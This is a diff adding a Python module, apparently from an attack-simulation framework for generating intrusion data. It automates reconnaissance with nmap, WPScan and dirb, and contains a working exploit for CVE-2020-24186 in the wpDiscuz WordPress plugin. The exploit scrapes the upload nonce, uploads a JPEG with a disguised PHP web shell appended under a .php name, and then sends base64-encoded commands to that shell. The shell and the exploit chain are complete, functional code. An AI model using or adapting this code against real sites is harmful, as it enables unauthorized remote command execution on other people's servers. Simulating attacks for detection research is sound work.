@@ -1,0 +1,563 @@
+import base64
+import json
+import os
+import pty
+import random
+import re
+import select
+import subprocess
+import sys
+
+from pathlib import Path
+from typing import (
+    List,
+    Optional,
+    TextIO,
+    Tuple,
+    Union,
+)
+
+import requests
+
+from bs4 import BeautifulSoup
+from structlog.stdlib import BoundLogger
+
+from cr_kyoushi.simulation.util import sleep
+
+from .context import Context
+
+
+def read_output(
+    process: subprocess.Popen,
+    log: BoundLogger,
+    p_stdout: select.poll,
+    p_stderr: select.poll,
+    sleep_time: float = 1.0,
+    encoding="utf-8",
+) -> Tuple[Optional[str], Optional[str]]:
+    """Reads and logs a single line of output (stdout and stderr) from a process.
+
+    Args:
+        process: The process to read the output from
+        log: The logger instance
+        p_stdout: The stdout output buffer poller
+        p_stderr: The stderr output buffer poller
+        sleep_time: The amount of time to wait for the buffers to become rdy
+        encoding: The expected output encoding
+
+    Returns:
+        A tuple of output lines (stdout, stderr).
+
+        !!! Note
+            Either output might be None if its output buffer was not ready/empty.
+    """
+    stdout_rdy = p_stdout.poll(sleep_time)
+    stderr_rdy = p_stderr.poll(sleep_time)
+    out = None
+    err = None
+    if stdout_rdy or stderr_rdy:
+        assert process.stdout is not None and process.stderr is not None
+        out = process.stdout.readline().decode(encoding) if stdout_rdy else None
+        err = process.stderr.readline().decode(encoding) if stderr_rdy else None
+        log.info("Got output", stdout=out, stderr=err)
+    else:
+        sleep(sleep_time)
+    return (out, err)
+
+
+def execute(
+    args: List[str],
+    log: BoundLogger,
+    use_pty: bool = False,
+    sleep_time: float = 1.5,
+    encoding: str = "utf-8",
+) -> Optional[int]:
+    """Executes a given command and continously logs its output.
+
+    Args:
+        args: The command and its arguments
+        log: The logger instance
+        use_pty: If the command should be executed with a PTY or not
+        sleep_time: The amount of time to wait between output buffer checks.
+        encoding: The output encoding that is expected
+
+    Returns:
+        The commands return code
+    """
+    stdin: Union[TextIO, int]
+    if use_pty:
+        main, sub = pty.openpty()
+        stdin = sub
+    else:
+        stdin = sys.stdin
+
+    process = subprocess.Popen(
+        args, stdin=stdin, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+    assert process.stdout is not None and process.stderr is not None
+
+    # get stdout stream rdy checker
+    p_stdout = select.poll()
+    p_stdout.register(process.stdout, select.POLLIN)
+
+    # get stderr stream rdy checker
+    p_stderr = select.poll()
+    p_stderr.register(process.stderr, select.POLLIN)
+
+    out_lines = []
+    err_lines = []
+    # read all output while process is running
+    while process.poll() is None:
+        out, err = read_output(process, log, p_stdout, p_stderr, sleep_time, encoding)
+        if out is not None and len(out) > 0:
+            out_lines.append(out)
+        if err is not None and len(err) > 0:
+            err_lines.append(err)
+
+    # we have to include calls to readlines as a process might have finished before
+    # we read all output lines
+    out_lines = out_lines + [
+        line.decode(encoding) for line in process.stdout.readlines()
+    ]
+    err_lines = err_lines + [
+        line.decode(encoding) for line in process.stderr.readlines()
+    ]
+
+    # finally log all output
+    log.info(
+        "Output",
+        stdout_lines=out_lines,
+        stderr_lines=err_lines,
+    )
+
+    # close pty if we opened it
+    if use_pty:
+        os.close(main)
+        os.close(sub)
+
+    return process.poll()
+
+
+class CommandAction:
+    """Generic command action transition function class
+
+    Executes a shell command and continiously logs the commands
+    stdout and stderr output until the command ends.
+    """
+
+    def __init__(self, args: List[str], name: str, use_pty: bool = False):
+        """
+        Args:
+            args: The command and its arguments
+            name: The name to use for logging command execution
+            use_pty: If the command should be started with a PTY or not
+        """
+        self.args = args
+        self.name = name
+        self.use_pty = use_pty
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        return log
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        # add log context from sub classes
+        log = self._add_log_context(log)
+        # add args to log context
+        log = log.bind(args=self.args)
+
+        # execute the command
+        log.info(f"Executing {self.name}")
+        ret = execute(self.args, log, use_pty=self.use_pty)
+        log.info(f"Executed {self.name}", return_code=ret)
+
+
+class Traceroute(CommandAction):
+    """Traceroute transition function"""
+
+    def __init__(self, host: str, executable: str = "/usr/sbin/traceroute"):
+        """
+        Args:
+            host: The host to traceroute to
+            executable: The path to the traceroute executable
+        """
+        self.host: str = host
+        super().__init__([executable, host], "traceroute")
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        log = log.bind(host=self.host)
+        return super()._add_log_context(log)
+
+
+class NmapHostScan(CommandAction):
+    def __init__(
+        self,
+        networks: List[str],
+        executable: str = "/usr/bin/nmap",
+        scan_option: str = "-sn",
+        extra_args: List[str] = [],
+    ):
+        """
+        Args:
+            networks: The networks to scan
+            executable: The path of the nmap executable
+            scan_option: The scan option to use for the host scan
+            extra_args: List of extra arguments for nmap
+        """
+        args = [executable, scan_option] + extra_args + networks
+        self.networks: List[str] = networks
+        super().__init__(args, "nmap host scan")
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        log = log.bind(networks=self.networks)
+        return super()._add_log_context(log)
+
+
+class NmapServiceScan(CommandAction):
+    """Nmap service scan transition function"""
+
+    def __init__(
+        self,
+        networks: List[str],
+        executable: str = "/usr/bin/nmap",
+        scan_option: str = "-sV",
+        extra_args: List[str] = [],
+    ):
+        """
+        Args:
+            networks: The networks to scan
+            executable: The path of the nmap executable
+            scan_option: The scan option to use for the service scan
+            extra_args: List of extra arguments for nmap
+        """
+        args = [executable, scan_option] + extra_args + networks
+        self.networks: List[str] = networks
+        super().__init__(args, "nmap service scan")
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        log = log.bind(networks=self.networks)
+        return super()._add_log_context(log)
+
+
+class NmapDNSBrute(CommandAction):
+    """Nmap dns brute force transition function"""
+
+    def __init__(
+        self,
+        dns_servers: List[str],
+        domain: str,
+        executable: str = "/usr/bin/nmap",
+        extra_args: List[str] = [],
+    ):
+        """
+        Args:
+            dns_servers: The dns servers to scan
+            domain: The domain to brute force
+            executable: The path of the nmap executable
+            extra_args: List of extra arguments for nmap
+        """
+        args = (
+            [executable]
+            + extra_args
+            + [
+                "--script=dns-brute",
+                "--script-args",
+                f"dns-brute.domain={domain}",
+            ]
+            + dns_servers
+        )
+        self.dns_servers: List[str] = dns_servers
+        self.domain: str = domain
+        super().__init__(args, "nmap dns-brute")
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        log = log.bind(dns_servers=self.dns_servers, domain=self.domain)
+        return super()._add_log_context(log)
+
+
+class WPScan(CommandAction):
+    """WPScan transition function"""
+
+    def __init__(
+        self,
+        url: str,
+        executable: str = "/usr/local/bin/wpscan",
+        extra_args: List[str] = ["--disable-tls-checks"],
+    ):
+        """
+        Args:
+            url: The wordpress instances url
+            executable: Path to the WPScan executable
+            extra_args: List of extra arguments for WPScan
+        """
+        args = (
+            [executable]
+            + extra_args
+            + [
+                "--url",
+                url,
+            ]
+        )
+        self.url: str = url
+        super().__init__(args, "wpscan")
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        log = log.bind(url=self.url)
+        return super()._add_log_context(log)
+
+
+class Dirb(CommandAction):
+    """Dirb transition function"""
+
+    def __init__(
+        self,
+        urls: List[str],
+        wordlists: List[str] = [],
+        executable: str = "/usr/bin/dirb",
+        extra_args: List[str] = [],
+    ):
+        """
+        Args:
+            urls: The urls to run dirb against
+            wordlists: Optionally the wordlists to use
+            executable: The path to the dirb executable
+            extra_args: List of extra arguments for dirb
+        """
+        args = [executable] + urls + wordlists + extra_args
+        self.urls: List[str] = urls
+        self.wordlists: List[str] = wordlists
+        super().__init__(args, "dirb")
+
+    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
+        log = log.bind(urls=self.urls, wordlists=self.wordlists)
+        return super()._add_log_context(log)
+
+
+DEFAULT_WEB_SHELL: str = """
+<?php
+function wp_meta_info() {
+    if(isset($_REQUEST['wp_meta'])){
+            exec(implode(" ",json_decode(base64_decode($_REQUEST['wp_meta']))), $info);
+          return base64_encode(json_encode($info));
+    }else{
+        return "no meta";
+    }
+  }
+?>
+<html>
+<head><meta name="info" data="<?php echo wp_meta_info() ?>" /></head>
+<body>
+Stats
+</body>
+</html>
+"""
+
+
+class UploadWebShell:
+    """Transition function uploads a web shell to a wordpress instance.
+
+    !!! Note
+        This exploits CVE-2020-24186 for the upload see
+        https://wpscan.com/vulnerability/10333
+
+    """
+
+    def __init__(
+        self,
+        url: str,
+        jpeg: Path,
+        image_name: Optional[str] = None,
+        admin_ajax: str = "wp-admin/admin-ajax.php",
+        exploit_code: str = DEFAULT_WEB_SHELL,
+        verify: bool = False,
+    ):
+        """
+        Args:
+            url: The wordpress url
+            jpeg: The path to the jpeg file to embed the code in
+            image_name: The name to use when uploading the image (without the file extension).
+                        Defaults to the name of the given jpeg file.
+            admin_ajax: The relative path to the ajax endpoint (without leading /)
+            exploit_code: The PHP web shell code to upload
+            verify: If TLS certs should be verified or not
+        """
+        self.url: str = url
+        self.admin_ajax: str = f"{url}/{admin_ajax}"
+        self.jpeg: Path = jpeg
+        self.image_name: str = image_name or jpeg.stem
+        self.image_name += ".php"
+        self.exploit_code: str = exploit_code
+        self.verify: bool = verify
+        self.nonce_regex: re.Pattern = re.compile(r'wmuSecurity"\s*:\s*"(\w*)"')
+        with open(jpeg, "rb") as f:
+            self.payload = f.read() + exploit_code.encode("utf-8")
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        log = log.bind(
+            url=self.url,
+            admin_ajax=self.admin_ajax,
+            image_name=self.image_name,
+            jpeg=self.jpeg,
+            exploit_code=self.exploit_code,
+        )
+
+        session = requests.Session()
+        session.verify = self.verify
+
+        # get list of available posts
+        log.info("Load posts page")
+        response = session.get(self.url)
+        log.info("Loaded posts page")
+        soup = BeautifulSoup(response.text, "html.parser")
+        articles = soup.find(id="site-content").find_all(name="article")
+
+        if len(articles) > 0:
+            # choose a random article under which to deploy the web shell
+            article = random.choice(articles)
+            post_url = article.find(name="h2", class_="entry-title").a.get("href")
+            post_id = article.get("id").replace("post-", "")
+
+            # add post id to log context
+            log = log.bind(post_id=post_id, post_url=post_url)
+
+            log.info("Load post info")
+            response = session.get(post_url)
+            log.info("Loaded post info")
+
+            soup = BeautifulSoup(response.text, "html.parser")
+            match = self.nonce_regex.search(
+                soup.find("script", id="wpdiscuz-combo-js-js-extra").string,
+            )
+
+            if match is not None:
+                nonce = match.group(1)
+
+                # add nonce to log context
+                log = log.bind(wmu_nonce=nonce)
+
+                data = {
+                    "action": "wmuUploadFiles",
+                    "wmu_nonce": nonce,
+                    "wmuAttachmentsData": None,
+                    "postId": post_id,
+                }
+
+                files = {
+                    "wmu_files[0]": (
+                        self.image_name,
+                        self.payload,
+                        "image/jpeg",
+                    )
+                }
+                log.info("Uploading web shell")
+                response = session.post(self.admin_ajax, data=data, files=files)
+                json = response.json()
+                context.web_shell = (
+                    json.get("data").get("previewsData").get("images")[0].get("url")
+                )
+                log.info("Uploaded web shell", web_shell=context.web_shell)
+            else:
+                log.error("Unable to retrieve nonce")
+        else:
+            log.error("No post to upload shell to")
+
+
+def encode_cmd(cmd: List[str]) -> str:
+    """Encodes the command and args list with JSON and base64.
+
+    Args:
+        cmd: The command and args list
+
+    Returns:
+        The base64 encoded command payload
+    """
+    return base64.b64encode(json.dumps(cmd).encode("utf-8")).decode("utf-8")
+
+
+def decode_response(response: str) -> List[str]:
+    """Extracts the web shell command output from the HTML response
+
+    Args:
+        response: The HTML response
+
+    Returns:
+        The command output as list of lines
+    """
+    soup = BeautifulSoup(response, "html.parser")
+    for tag in soup.findAll(name="meta", attrs={"name": "info"}):
+        if tag.has_attr("data"):
+            return json.loads(base64.b64decode(tag["data"]))
+    return []
+
+
+def send_request(
+    log: BoundLogger,
+    url: str,
+    cmd: List[str],
+    cmd_param: str = "wp_meta",
+    verify: bool = False,
+) -> List[str]:
+    """Sends a b64 encoded web shell command via the given GET param.
+
+    Args:
+        log: The logging instance
+        url: The URL to the web shell
+        cmd: The command and its arguments as a list
+        cmd_param: The GET parameter to embed the command in.
+        verify: If HTTPS connection should very TLS certs
+
+    Returns:
+        The commands output lines
+    """
+    # prepare get parameters and add them to log context
+    get_params = {cmd_param: encode_cmd(cmd)}
+    log = log.bind(params=get_params)
+
+    log.info("Sending web shell command")
+    r = requests.get(url, params=get_params, verify=verify)
+    log.info("Sent web shell command")
+
+    return decode_response(r.text)
+
+
+class ExecWebShellCommand:
+    """Transition function that executes a web shell command"""
+
+    def __init__(
+        self,
+        cmd: List[str],
+        cmd_param: str = "wp_meta",
+        verify: bool = False,
+    ):
+        """
+        Args:
+            cmd: The command and its arguments to execute
+            cmd_param: The GET parameter to send the command in
+            verify: If the TLS certs should be verified or not
+        """
+        self.cmd: List[str] = cmd
+        self.cmd_param: str = cmd_param
+        self.verify: bool = verify
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        web_shell = context.web_shell
+        log = log.bind(cmd=self.cmd, cmd_param=self.cmd_param, web_shell=web_shell)
+        output = send_request(log, web_shell, self.cmd, self.cmd_param, self.verify)
+        log.info("Web shell command response", output=output)
